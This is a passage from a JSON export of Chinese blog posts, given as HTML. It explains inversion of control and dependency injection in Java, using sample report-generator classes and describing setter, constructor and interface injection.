style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，应该更能帮助理清例子的演进历程。</span></span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:9pt; font-family:Arial; color:rgb(51,51,51)\"><a target=\"_blank\" target=\"_blank\" href=\"http://haolloyin.blog.51cto.com/1177454/458416\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体; color:rgb(186,38,54)\"><span style=\"padding:0px; margin:0px\">演进式例解控制反转（</span><span style=\"padding:0px; margin:0px; font-size:12pt\">IoC</span><span style=\"padding:0px; margin:0px; font-size:12pt\">）、依赖注入（</span><span style=\"padding:0px; margin:0px; font-size:12pt\">DI</span><span style=\"padding:0px; margin:0px; font-size:12pt\">）之</span><span style=\"padding:0px; margin:0px\">一</span></span></a></span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">其他</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:'Courier New'; color:black\">2</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">种依赖注入方式：</span></span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">上面用到的是</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">setter</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">方式的依赖注入，还有</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">constructor</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">方式的构造器注入、接口注入。</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:'Courier New'; color:black\">1</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:'Courier New'; color:black\">constructor&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">方式</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">与</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">setter&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">方式很类&#20284;，只不过有所差异，例如：如果有过多组件需要注入，</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">constructor</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">方式则会造成参数列表过长；也比较僵化，因为该注入只发生在构造期，而</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">setter&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">方式或者比较灵活些，需要时则注入。</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:'Courier New'; color:black\">2</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、接口方式</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">据说该方式的注入不常用，一些</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">IoC</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">框架如</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Spring</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">也不怎么支持，问题在于其真的是比较麻烦：定义特定</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">interface</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，并声明所需接口（即待实现的</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Method</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">），最后组件类通过实现该</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">interface&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">中的特定</span><span style=\"padding:0px; margin:0px; font-family:'Courier New'; color:black\">Method&nbsp;</span><span style=\"padding:0px; margin:0px; font-family:宋体\">进行组件依赖注入。既然少用，也不给出代码了。</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">小结：</span></span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">感觉按照着逐步演进的步骤来理解一个问题的出现、分析原因、解决、分析结果是比较容易接收的，你觉得呢？</span></div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n</div>\r\n",
			"tags":"spring,ioc,控制反转,依赖注入,DI",
			"id":"49617307",
			"categories":"JAVA_spring",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年11月03日 15:35:39",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"原文地址：http://haolloyin.blog.51cto.com/1177454/458416/\r\n\r\n\r\n\r\n\r\n近来总是接触到 IoC（Inversion\r\n of Control，控制反转）、DI（Dependency\r\n Injection，依赖注入）等编程原则或者模式，而这些是著名 Java 框架 Spring、Struts 等的核心所在。针对此查了Wikipedia 中各个条目",
			"title":"演进式例解控制反转（IoC）、依赖注入（DI）之一",
			"type":"repost",
			"content":"\r\n<p>原文地址：http://haolloyin.blog.51cto.com/1177454/458416/</p>\r\n<p><br>\r\n</p>\r\n<p></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">近来总是接触到</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;IoC</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">（</span><span style=\"padding:0px; margin:0px; font-size:12pt\">Inversion\r\n of Control</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，控制反转）、</span><span style=\"padding:0px; margin:0px; font-size:12pt\">DI</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">（</span><span style=\"padding:0px; margin:0px; font-size:12pt\">Dependency\r\n Injection</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，依赖注入）等编程原则或者模式，而这些是著名</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Java&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">框架</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Spring</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">、</span><span style=\"padding:0px; margin:0px; font-size:12pt\">Struts&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">等的核心所在。针对此查了</span><span style=\"padding:0px; margin:0px; font-size:12pt\">Wikipedia&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">中各个条目，并从图书馆借来相关书籍，阅读后有些理解，现结合书中的讲解以及自己的加工整理如下：</span></p>\r\n<div style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">问题描述：</span></span></div>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">开发一个能够按照不同要求生成</span><span style=\"padding:0px; margin:0px; font-size:12pt\">Excel</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">或</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;PDF&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">&#26684;式的报表的系统，例如日报表、月报表等等。</span></p>\r\n<div style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">解决方案：</span></span></div>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">根据“面向接口编程”的原则，应该分离接口与实现，即将生成报表的功能提取为一个通用接口</span><span style=\"padding:0px; margin:0px; font-size:12pt\">ReportGenerator</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，并提供生成</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Excel&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">和</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;PDF</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">&#26684;式报表的两个实现类</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;ExcelGenerator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">和</span><span style=\"padding:0px; margin:0px; font-size:12pt\">PDFGenerator</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，而客户</span><span style=\"padding:0px; margin:0px; font-size:12pt\">Client&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">再通过服务提供者</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;ReportService&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">获取相应的报表打印功能。</span></p>\r\n<div style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">实现方法：</span></span></div>\r\n<div style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">根据上面所述，得到如下类图：</span></div>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt\"></span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<a target=\"_blank\" target=\"_blank\" href=\"http://img1.51cto.com/attachment/201012/212146773.jpg\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\"><img border=\"0\" alt=\"\" src=\"http://img1.51cto.com/attachment/201012/212146773.jpg\" style=\"padding:0px; margin:0px; vertical-align:top; border:none\"></a></p>\r\n<div style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">代码实现：</span></div>\r\n<div style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<pre style=\"padding:0px; margin-top:0px; margin-bottom:1em; font-family:'Courier New',monospace; overflow:auto; width:710.813px; color:rgb(85,85,85); background:rgb(247,247,247)\"><ol class=\"dp-j\" style=\"padding:5px 0px; margin:0px; color:rgb(92,92,92); border-left-width:3px; border-style:none none none solid; border-left-color:rgb(20,107,0)\"><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\"><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">interface</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ReportGenerator&nbsp;{&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">void</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;generate(Table&nbsp;table);&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">}&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\"><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">class</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ExcelGenerator&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">implements</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ReportGenerator&nbsp;{&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">void</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;generate(Table&nbsp;table)&nbsp;{&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(<span class=\"string\" style=\"padding:0px; margin:0px; border:none; color:blue; background-color:inherit\">&quot;generate&nbsp;an&nbsp;Excel&nbsp;report&nbsp;...&quot;</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">);&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">}&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\"><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">class</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;PDFGenerator&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">implements</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ReportGenerator&nbsp;{&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">void</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;generate(Table&nbsp;table)&nbsp;{&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(<span class=\"string\" style=\"padding:0px; margin:0px; border:none; color:blue; background-color:inherit\">&quot;generate&nbsp;an&nbsp;PDF&nbsp;report&nbsp;...&quot;</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">);&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">}&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\"><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">class</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ReportService&nbsp;{&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//&nbsp;负责创建具体需要的报表生成器</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">private</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ReportGenerator&nbsp;generator&nbsp;=&nbsp;</span><span style=\"padding:0px; margin:0px; border:none; background-color:rgb(255,255,0)\"><span style=\"padding:0px; margin:0px\"><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); background-color:inherit\">new</span>&nbsp;PDFGenerator()</span></span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">;&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//&nbsp;private&nbsp;static&nbsp;ReportGenerator&nbsp;generator&nbsp;=&nbsp;new&nbsp;ExcelGenerator();</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">void</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;getDailyReport(Date&nbsp;date)&nbsp;{&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;table.setDate(date);&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//&nbsp;...</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;generator.generate(table);&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">void</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;getMonthlyReport(Month&nbsp;month)&nbsp;{&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;table.setMonth(month);&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//&nbsp;...</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; 